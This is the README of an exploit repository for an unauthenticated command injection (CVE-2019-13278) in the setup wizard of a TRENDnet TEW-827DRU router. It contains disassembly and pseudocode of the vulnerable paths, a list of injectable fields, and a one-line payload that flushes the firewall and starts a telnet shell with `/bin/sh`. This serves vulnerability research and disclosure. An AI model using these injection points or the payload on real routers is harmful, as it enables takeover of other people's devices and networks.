## CVE-2019-13278 

These scripts exercise an unauthenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect
to a reverse shell.

The router allows unauthenticated access to the setup wizard functionality which contains a multitude of command 
injections. There are three main exploitable paths within the wizard: DHCP (mac), L2TP, and PPTP. 

## wizard_l2tp_cmdinj.py
Within the setup wizard there is a command injection while processing all user defined values to the 
`do_wizard_wan_l2tp_cgi` function. The vulnerable disassembly for the first user processed values is shown below.

```
LOAD:0043DAB0                 addiu   $s0, $v0, (aUciSetNetworkW_0 - 0x4D0000)  # "uci set network.wan.hostname=%s"
LOAD:0043DAB4                 la      $v0, aTDelay     # "t_delay"
LOAD:0043DAB8                 nop
LOAD:0043DABC                 addiu   $a0, $v0, (aSystemSystem0H_0 - 0x4C0000)  # "system.@system[0].hostname"
LOAD:0043DAC0                 la      $v0, safe_getenv
LOAD:0043DAC4                 nop
LOAD:0043DAC8                 move    $t9, $v0
LOAD:0043DACC                 bal     safe_getenv
LOAD:0043DAD0                 nop
LOAD:0043DAD4                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043DAD8                 addiu   $v1, $fp, 0x138+var_114
LOAD:0043DADC                 move    $a0, $v1         # s
LOAD:0043DAE0                 move    $a1, $s0         # format
LOAD:0043DAE4                 move    $a2, $v0
LOAD:0043DAE8                 la      $v0, sprintf
LOAD:0043DAEC                 nop
LOAD:0043DAF0                 move    $t9, $v0
LOAD:0043DAF4                 jalr    $t9 ; sprintf
LOAD:0043DAF8                 nop
LOAD:0043DAFC                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043DB00                 addiu   $v0, $fp, 0x138+var_114
LOAD:0043DB04                 move    $a0, $v0         # command
LOAD:0043DB08                 la      $v0, _system
LOAD:0043DB0C                 nop
LOAD:0043DB10                 move    $t9, $v0
LOAD:0043DB14                 jalr    $t9 ; _system
LOAD:0043DB18                 nop
```

`system.@system[0].hostname` can be replace with other user defined values requiring minimal changes to the exploit. The
other valid values are:
* `cameo.wan.wan_l2tp_server_ip`
* `cameo.wan.wan_l2tp_username`
* `cameo.wan.wan_l2tp_password`
* `cameo.wan.wan_l2tp_ipaddr` (requires `cameo.wan.wan_l2tp_dynamic` != 1)
* `cameo.wan.wan_l2tp_netmask` (requires `cameo.wan.wan_l2tp_dynamic` != 1)
* `cameo.wan.wan_l2tp_gateway` (requires `cameo.wan.wan_l2tp_dynamic` != 1)

Pseudo Code:
```
hostname = safe_getenv("system.@system[0].hostame");

sprintf(var_114, "uci set network.wan.hostname=%s", hostname);
_system(var_114);
```

## wizard_mac_cmdinj.py
Within the setup wizard there is a command injection processing the MAC address after setting DHCP WAN parameters. The 
vulnerable disassembly is shown below.

```
LOAD:0043EE30                 addiu   $a0, $v0, (aCameoWanWanMac - 0x4C0000)  # "cameo.wan.wan_mac"
LOAD:0043EE34                 la      $v0, safe_getenv
LOAD:0043EE38                 nop
LOAD:0043EE3C                 move    $t9, $v0
LOAD:0043EE40                 bal     safe_getenv
LOAD:0043EE44                 nop
LOAD:0043EE48                 lw      $gp, 0x128+saved_gp($fp)
LOAD:0043EE4C                 sw      $v0, 0x128+var_10C($fp)
LOAD:0043EE50                 lw      $v0, 0x128+arg_0($fp)
LOAD:0043EE54                 nop
LOAD:0043EE58                 beqz    $v0, loc_43EEBC
...
LOAD:0043EEBC                 la      $v0, aIdge       # "idge"
LOAD:0043EEC0                 nop
LOAD:0043EEC4                 addiu   $v0, (aUciSetNetworkW_5 - 0x4D0000)  # "uci set network.wan.macaddr=%s"
LOAD:0043EEC8                 addiu   $v1, $fp, 0x128+var_108
LOAD:0043EECC                 move    $a0, $v1         # s
LOAD:0043EED0                 move    $a1, $v0         # format
LOAD:0043EED4                 lw      $a2, 0x128+var_10C($fp)
LOAD:0043EED8                 la      $v0, sprintf
LOAD:0043EEDC                 nop
LOAD:0043EEE0                 move    $t9, $v0
LOAD:0043EEE4                 jalr    $t9 ; sprintf
LOAD:0043EEE8                 nop
LOAD:0043EEEC                 lw      $gp, 0x128+saved_gp($fp)
LOAD:0043EEF0                 addiu   $v0, $fp, 0x128+var_108
LOAD:0043EEF4                 move    $a0, $v0         # command
LOAD:0043EEF8                 la      $v0, _system
LOAD:0043EEFC                 nop
LOAD:0043EF00                 move    $t9, $v0
LOAD:0043EF04                 jalr    $t9 ; _system
LOAD:0043EF08                 nop
```

Pseudo Code:
```
wan_mac = safe_getenv("cameo.wan.wan_mac");

sprintf(var_108, "uci set network.wan.macaddr=%s", wan_mac);
_system(var_108);
```

## wizard_pptp_cmdinj.py
Within the setup wizard there is a command injection processing all user defined values to the `do_wizard_wan_pptp_cgi` 
function. The vulnerable disassembly for the first user processed values is shown below.

```
LOAD:0043C708                 addiu   $s0, $v0, (aUciSetNetworkW_0 - 0x4D0000)  # "uci set network.wan.hostname=%s"
LOAD:0043C70C                 la      $v0, aTDelay     # "t_delay"
LOAD:0043C710                 nop
LOAD:0043C714                 addiu   $a0, $v0, (aSystemSystem0H_0 - 0x4C0000)  # "system.@system[0].hostname"
LOAD:0043C718                 la      $v0, safe_getenv
LOAD:0043C71C                 nop
LOAD:0043C720                 move    $t9, $v0
LOAD:0043C724                 bal     safe_getenv
LOAD:0043C728                 nop
LOAD:0043C72C                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043C730                 addiu   $v1, $fp, 0x138+var_114
LOAD:0043C734                 move    $a0, $v1         # s
LOAD:0043C738                 move    $a1, $s0         # format
LOAD:0043C73C                 move    $a2, $v0
LOAD:0043C740                 la      $v0, sprintf
LOAD:0043C744                 nop
LOAD:0043C748                 move    $t9, $v0
LOAD:0043C74C                 jalr    $t9 ; sprintf
LOAD:0043C750                 nop
LOAD:0043C754                 lw      $gp, 0x138+saved_gp($fp)
LOAD:0043C758                 addiu   $v0, $fp, 0x138+var_114
LOAD:0043C75C                 move    $a0, $v0         # command
LOAD:0043C760                 la      $v0, _system
LOAD:0043C764                 nop
LOAD:0043C768                 move    $t9, $v0
LOAD:0043C76C                 jalr    $t9 ; _system
LOAD:0043C770                 nop
```

`system.@system[0].hostname` can be replace with other user defined values requiring minimal changes to the exploit. The
other valid values are:
* `cameo.wan.wan_pptp_server_ip`
* `cameo.wan.wan_pptp_username`
* `cameo.wan.wan_pptp_password`
* `cameo.wan.wan_pptp_ipaddr` (requires `cameo.wan.wan_pptp_dynamic` != 1)
* `cameo.wan.wan_pptp_netmask` (requires `cameo.wan.wan_pptp_dynamic` != 1)
* `cameo.wan.wan_pptp_gateway` (requires `cameo.wan.wan_pptp_dynamic` != 1)

Pseudo Code:
```
hostname = safe_getenv("system.@system[0].hostame");

sprintf(var_114, "uci set network.wan.hostname=%s", hostname);
_system(var_114);
```

## Injected Command
The command that is injected in all exploits will flush `iptable` rules and execute a telnet server listening on a user 
supplied port. Upon connecting to the telnet server it will run `/bin/sh` providing a reverse shell. 

`iptables -F|telnetd -l /bin/sh -p PORT`


## Example Output
![Example Output](./img/l2tp_cmdinj.png)
